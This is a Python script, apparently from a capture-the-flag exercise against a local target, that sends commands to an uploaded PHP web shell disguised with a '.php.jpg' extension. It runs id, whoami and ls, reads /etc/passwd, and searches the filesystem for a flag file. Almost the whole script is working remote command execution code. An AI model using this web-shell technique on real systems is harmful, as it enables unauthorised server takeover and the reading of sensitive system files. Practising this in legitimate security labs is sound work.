import requests

base_url = "http://127.0.0.1:32824"

print("Testing command execution via uploaded PHP shell...")
print("=" * 60)

# The shell is at /upload/shell.php.jpg
shell_url = f"{base_url}/upload/shell.php.jpg"

# Try to execute commands
test_commands = ['id', 'whoami', 'pwd', 'ls -la', 'cat /etc/passwd']

for cmd in test_commands:
    url = f"{shell_url}?cmd={cmd}"
    resp = requests.get(url)
    print(f"\nCommand: {cmd}")
    print(f"Status: {resp.status_code}")
    print(f"Response length: {len(resp.content)}")
    
    # Check if command executed (look for typical output)
    content = resp.text
    if 'uid=' in content or 'root:' in content or 'www-data' in content:
        print(f"[COMMAND EXECUTED] Output:")
        print(content)
        break
    elif len(content) < 2000:
        print(f"Response: {content}")

# Try to find the flag file
print("\n" + "=" * 60)
print("Searching for flag file...")

# First, list root directory
response = requests.get(f"{shell_url}?cmd=ls%20-la%20/")
print(f"\nls -la / output: {response.text}")

# List common flag locations
flag_locations = ['/flag*', '/tmp/flag*', '/root/flag*', '/home/flag*', '/opt/flag*']
for location in flag_locations:
    response = requests.get(f"{shell_url}?cmd=ls%20-la%20{location}")
    if 'flag' in response.text.lower() and 'No such' not in response.text:
        print(f"[FOUND] Flag in {location}:")
        print(response.text)

# Try to read /flag directly
print("\nTrying to read /flag...")
response = requests.get(f"{shell_url}?cmd=cat%20/flag")
if '/' in response.text and len(response.text.strip()) > 10:
    print(f"FLAG FOUND: {response.text.strip()}")
else:
    print(f"Response: {response.text}")

# Try other common locations
common_flags = ['/flag', '/flag.txt', '/tmp/flag', '/tmp/flag.txt']
for flag_path in common_flags:
    response = requests.get(f"{shell_url}?cmd=cat%20{flag_path}")
    content = response.text.strip()
    if content and 'No such' not in content:
        print(f"\nContent of {flag_path}:")
        print(content)
        if 'FLAG{' in content:
            break

print("\n" + "=" * 60)
print("Command execution testing complete.")
